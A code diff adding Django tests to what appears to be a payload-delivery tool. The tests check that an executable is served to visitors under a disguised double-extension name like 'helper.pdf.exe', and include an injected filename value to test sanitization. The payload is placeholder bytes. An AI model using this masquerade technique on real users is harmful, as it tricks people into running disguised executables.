@@ -3028,3 +3028,52 @@ class UpdateScriptTests(TestCase):
         self.assertIn("git pull --ff-only", script)
         self.assertIn("start.sh --reset", script)
         self.assertIn("builder prune", script)
+
+
+@override_settings(AUTO_BAN_THRESHOLD=0)
+class ServeAsFilenameTests(TestCase):
+    def setUp(self):
+        self.operator = Operator.objects.create_user(username="saop", password="long-enough-password-123")
+        self.client = Client()
+        self.client.force_login(self.operator)
+        self.public = Client()
+
+    def test_payload_downloads_under_masquerade_name(self):
+        link = DeliveryLink.objects.create(path="/g/sa/one", kind="file", placeholder="blank",
+                                           serve_as="helper.pdf.exe")
+        link.payload.save("fwfafs.exe", ContentFile(b"MZ payload bytes"), save=True)
+        response = self.public.get("/g/sa/one")
+        self.assertEqual(response.status_code, 200)
+        self.assertIn('filename="helper.pdf.exe"', response["Content-Disposition"])
+        self.assertEqual(response.content, b"MZ payload bytes")
+        # storage keeps the real name
+        link.refresh_from_db()
+        self.assertIn("fwfafs", link.payload.name)
+        hit = HitEvent.objects.get(category="download")
+        self.assertEqual(hit.detail["served_as"], "helper.pdf.exe")
+
+    def test_empty_serve_as_keeps_real_name(self):
+        link = DeliveryLink.objects.create(path="/g/sa/two", kind="file", placeholder="blank")
+        link.payload.save("real-name.bin", ContentFile(b"DATA"), save=True)
+        response = self.public.get("/g/sa/two")
+        self.assertIn("real-name", response["Content-Disposition"])
+
+    def test_serve_as_sanitized(self):
+        link = DeliveryLink.objects.create(path="/g/sa/three", kind="file", placeholder="blank",
+                                           serve_as='..\\evil"quot;.exe')
+        link.payload.save("x.exe", ContentFile(b"X"), save=True)
+        response = self.public.get("/g/sa/three")
+        self.assertNotIn('"quot;', response["Content-Disposition"])
+        self.assertNotIn("..", response["Content-Disposition"])
+
+    def test_form_and_api_roundtrip(self):
+        response = self.client.post(reverse("gate-link-create"), {
+            "path": "/g/sa/form", "kind": "file", "gate_type": "none", "cipher": "none",
+            "placeholder": "blank", "on_deny": "not_found", "serve_as": "report.pdf.exe",
+            "active": "on",
+        })
+        link = DeliveryLink.objects.get(path="/g/sa/form")
+        self.assertEqual(link.serve_as, "report.pdf.exe")
+        _, raw = APIKey.create(operator=self.operator, name="ci")
+        detail = self.client.get(f"/api/v1/links/{link.pk}/", HTTP_AUTHORIZATION=f"ApiKey {raw}")
+        self.assertEqual(detail.json()["serve_as"], "report.pdf.exe")
